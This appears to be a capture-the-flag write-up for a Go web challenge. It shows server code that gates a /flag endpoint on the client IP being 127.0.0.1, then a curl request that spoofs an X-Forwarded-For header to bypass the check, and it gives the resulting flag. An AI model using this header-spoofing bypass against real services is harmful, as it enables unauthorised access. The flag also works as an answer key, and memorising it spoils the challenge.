# We know this all too well

## Description

![](Pasted%20image%2020220312172439.png)

![](Pasted%20image%2020220312172450.png)

## Solution

### Looking through the code

I downloaded the files and looked at the code, more specifically these 2 files


``/dist/app/server/server.go`
```go

func flagHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	fmt.Fprint(w, logic.Flagger(r))
	return
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	fmt.Fprint(w, "And you were tossing me the car keys, f the patriarchy")
	return
}

func Init() {
	servers := []controller.Handler{
		{Path: "/", F: homeHandler, Methods: []string{"GET"}},
		{Path: "/login", F: loginHandler, Methods: []string{"POST"}},
		{Path: "/register", F: registerHandler, Methods: []string{"POST"}},
		{Path: "/verify", F: verifyHandler, Methods: []string{"POST"}},
		{Path: "/cornelia", F: corneliaHandler, Methods: []string{"POST"}},
		{Path: "/search", F: serachHandler, Methods: []string{"GET"}},
		{Path: "/flag", F: flagHandler, Methods: []string{"GET"}},
	}
	controller.RegisterRoute(servers)
	controller.Run()
}
```

`/dist/app/logic/logic.go`

```go
func Flagger(r *http.Request) string {
	ip, _ := remoteaddr.Parse().IP(r)
	if ip != "127.0.0.1" {
		return "I get older but your lovers stay my age."
	}
	return os.Getenv("FLAG")
}
```

### Bypassing IP Check

Change IP address forwarded header to bypass whitelist?

```bash
(base) [hacker@hackerbook build]$ curl "http://chals.ctf.sg:40301/flag" -H "X-Forwarded-For: 127.0.0.1"
CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}(base) [hacker@hackerbook build]$ 
```

## Flag

`CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}`
